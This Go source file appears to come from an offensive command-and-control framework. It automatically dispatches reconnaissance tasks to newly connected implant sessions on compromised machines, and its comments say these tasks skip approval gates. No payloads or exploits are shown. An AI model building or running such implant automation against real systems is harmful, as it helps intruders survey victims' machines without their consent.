package autoharvest

import (
	"context"
	"log"
	"sync"
	"time"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/db"
	"github.com/KKingZero/erebus-exploit-framwork/server/tasks"
)

// AutoHarvester subscribes to SESSION_NEW events and dispatches recon tasks
// automatically on new implant sessions. All dispatched tasks are recon-level
// and do not trigger approval gates.
type AutoHarvester struct {
	config     *AutoHarvestConfig
	dispatcher *tasks.Dispatcher
	store      *db.Store
	unsub      func()
	done       chan struct{}
	debug      bool

	// H1: Mutex to prevent race condition in idempotency check
	sessionMu sync.Mutex
}

// New creates a new AutoHarvester.
func New(cfg *AutoHarvestConfig, dispatcher *tasks.Dispatcher, store *db.Store) *AutoHarvester {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	return &AutoHarvester{
		config:     cfg,
		dispatcher: dispatcher,
		store:      store,
		done:       make(chan struct{}),
	}
}

// Start subscribes to the event bus and begins processing SESSION_NEW events.
func (h *AutoHarvester) Start(eventCh <-chan *pb.Event, unsub func(), debug bool) {
	h.debug = debug
	if !h.config.Enabled {
		log.Printf("[autoharvest] disabled by configuration")
		return
	}

	h.unsub = unsub
	go h.run(eventCh)
	log.Printf("[autoharvest] started — will dispatch recon tasks on new sessions")
}

// Stop unsubscribes from the event bus and shuts down.
func (h *AutoHarvester) Stop() {
	close(h.done)
	if h.unsub != nil {
		h.unsub()
	}
}

func (h *AutoHarvester) run(eventCh <-chan *pb.Event) {
	for {
		select {
		case event, ok := <-eventCh:
			if !ok {
				return
			}
			if event.Type == pb.EventType_EVENT_SESSION_NEW {
				h.onNewSession(event)
			}
		case <-h.done:
			return
		}
	}
}

func (h *AutoHarvester) onNewSession(event *pb.Event) {
	sessionID := event.SessionId
	if sessionID == "" {
		return
	}

	// H1: Use mutex to make HasAutoHarvested check + CreateAutoHarvestTask atomic
	h.sessionMu.Lock()
	defer h.sessionMu.Unlock()

	// Check if we've already auto-harvested this session (idempotency)
	if h.store != nil {
		harvested, err := h.store.HasAutoHarvested(sessionID)
		if err == nil && harvested {
			return
		}
	}

	// M9: Determine target OS from the session — handle missing session gracefully
	targetOS := ""
	if h.store != nil {
		sess, err := h.store.GetSession(sessionID)
		if err != nil {
			log.Printf("[autoharvest] session %s not found in DB, using default tasks", sessionID)
		} else {
			targetOS = sess.OS
		}
	}

	harvestTasks := DefaultTasks(targetOS)

	// M10: Gate verbose logging behind debug flag
	if h.debug {
		log.Printf("[autoharvest] dispatching %d recon tasks for session %s", len(harvestTasks), sessionID)
	}

	// H3: Derive context from harvester lifecycle instead of context.Background()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		select {
		case <-h.done:
			cancel()
		case <-ctx.Done():
		}
	}()
	defer cancel()

	for _, ht := range harvestTasks {
		taskID, _, err := h.dispatcher.Dispatch(ctx, sessionID, ht.TaskType, ht.Data, 120000, false)
		if err != nil {
			log.Printf("[autoharvest] failed to dispatch %s for %s: %v", ht.Name, sessionID, err)
			continue
		}

		// Track the dispatched task
		if h.store != nil {
			// H4: Check RandomID error instead of discarding
			id, err := zcrypto.RandomID(8)
			if err != nil {
				log.Printf("[autoharvest] failed to generate task tracking ID: %v", err)
				continue
			}
			if err := h.store.CreateAutoHarvestTask(&db.AutoHarvestTaskRow{
				ID:        id,
				SessionID: sessionID,
				TaskID:    taskID,
				TaskType:  ht.Name,
				Status:    "pending",
				CreatedAt: time.Now(),
			}); err != nil {
				log.Printf("[autoharvest] failed to track task %s: %v", taskID, err)
			}
		}

		if h.debug {
			log.Printf("[autoharvest] dispatched %s (task=%s) for session %s", ht.Name, taskID, sessionID)
		}
	}
}
